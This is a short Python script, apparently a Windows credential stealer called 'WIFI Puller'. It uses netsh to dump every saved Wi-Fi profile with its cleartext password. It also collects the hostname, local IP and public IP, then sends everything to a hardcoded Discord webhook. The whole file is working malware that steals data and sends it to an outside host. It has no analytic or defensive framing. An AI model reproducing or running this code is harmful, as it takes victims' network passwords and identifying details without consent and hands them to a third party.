
import requests
import socket
import subprocess
import json

def sendData(title, message):

    data = {
        "content": "",
        "username": "WIFI Puller",
        "avatar_url": "https://example.com/avatar.png",
        "embeds": [
            {
                "title": str(title),
                "description": str(message),
                "color": 16711680  # RGB color value
            }
        ]
    }
    requests.post(URL, json=data)

def getHostname():
    hostname = socket.gethostname()
    localIP = socket.gethostbyname(hostname)
    publicIP = subprocess.run('powershell (Invoke-WebRequest ifconfig.me/ip).Content.Trim()'.split(), capture_output=True, text=True).stdout.splitlines()[0]
    return (hostname, localIP, publicIP)


def getWifiNetworks():
    out = subprocess.run(args='netsh wlan show profiles'.split(), capture_output=True, text=True)
    listOfSSIDs = [str(line[line.find(':')+1:]).strip() for line in out.stdout.splitlines() if line.find(':') != -1][1:]

    ret = {}

    for SSID in listOfSSIDs:
        out = subprocess.run(f'netsh wlan show profile name="{SSID}" key=clear'.split(), capture_output=True, text=True)
        arr = [line.split(':') for line in out.stdout.splitlines() if line.find(':') != -1]
        dic = {str(key).strip():str(value).strip() for key, value in arr}
        dic.pop(arr[0][0])
        password = dic['Key Content']
        ret[SSID] = {
            'SSID name': SSID,
            'Password' : password,
            ''.join(arr[0]):dic
        }
    return ret
    

def main():
    hostname, localIP, publicIP = getHostname()
    networks = getWifiNetworks()

    title = ' '.join([hostname, localIP, publicIP])
    message = json.dumps(networks, ensure_ascii=False, indent=4)
    sendData(title, message)
    pass


if __name__ == '__main__':
    URL = r'https://discordapp.com/api/webhooks/1086417159044993085/hZXin2pqdpa7DmCKQ6s7nlzQW3y4rCJ9YRzvH5a2BW7KKA1WWZDrMsXHnm_imRAqe3jW'
    main()